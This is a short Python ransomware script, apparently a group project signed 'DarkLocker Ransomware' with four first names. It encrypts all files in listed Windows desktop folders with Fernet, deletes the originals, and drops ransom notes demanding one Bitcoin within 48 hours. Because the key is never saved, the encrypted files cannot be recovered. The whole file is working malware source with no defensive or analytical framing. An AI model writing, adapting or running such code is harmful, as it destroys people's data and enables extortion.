from cryptography.fernet import Fernet
from os import listdir, remove, path

# Generate or provide a Fernet key (32-byte key for AES-like encryption)
KEY = Fernet.generate_key()  # You can store and reuse this key securely
ENC = Fernet(KEY)

# List of target directories to encrypt files from (update with correct paths)
target_dirs = [
    r'C:\Users\cyb44\Desktop\sensitive',  # First directory (example: username cyb44)
    r'C:\Users\R$D departments\Desktop\research',  # Second directory (example: username R$D departments)
    # Add more directories as needed
]

# List of paths to save ransom notes (update with correct paths)
ransom_note_paths = [
    r'C:\Users\cyb44\Desktop\DARKLOCKERGROUP3.txt',  # First ransom note path
    r'C:\Users\R$D departments\Desktop\DARKLOCKERGROUP3.txt',  # Second ransom note path
    # Add more paths as needed
]

# Function to encrypt a single file
def Encrypt(File_Name):
    with open(File_Name, 'rb') as File:
        Data = File.read()  # Read file content

    Encrypted_Data = ENC.encrypt(Data)  # Encrypt the file data

    # Save encrypted data with .DARKLOCKERGROUP3 extension
    with open(File_Name + '.DARKLOCKERGROUP3', 'wb') as File:
        File.write(Encrypted_Data)

    remove(File_Name)  # Delete the original file after encryption

# Loop through all target directories and encrypt files
for target_dir in target_dirs:
    if path.exists(target_dir):  # Ensure the directory exists before processing
        for item in listdir(target_dir):
            file_path = path.join(target_dir, item)
            if path.isfile(file_path):  # Ensure we only encrypt files, not directories
                Encrypt(file_path)
    else:
        print(f"Directory does not exist: {target_dir}")

# Create ransom note content
ransom_note = """\
SAY BYE TO YOUR FILES 

BY GROUP3 , MOHAMMED , NAWAF , YAZEED , MOHANNAD

OR SAY HI BY PAYING

To decrypt your files, send 1 Bitcoin to the following LINK:

1290DSJAJWJIOLLLOCODPWO@D90321&KOEA.ONION

Failure to pay within 48 hours will result in permanent data loss.

-- DarkLocker Ransomware --
"""

# Save ransom notes to multiple paths
for ransom_note_path in ransom_note_paths:
    if path.exists(path.dirname(ransom_note_path)):  # Ensure the directory exists
        with open(ransom_note_path, 'w') as note:
            note.write(ransom_note)
    else:
        print(f"Invalid path for ransom note: {ransom_note_path}")

print("Ransomware encryption complete.")
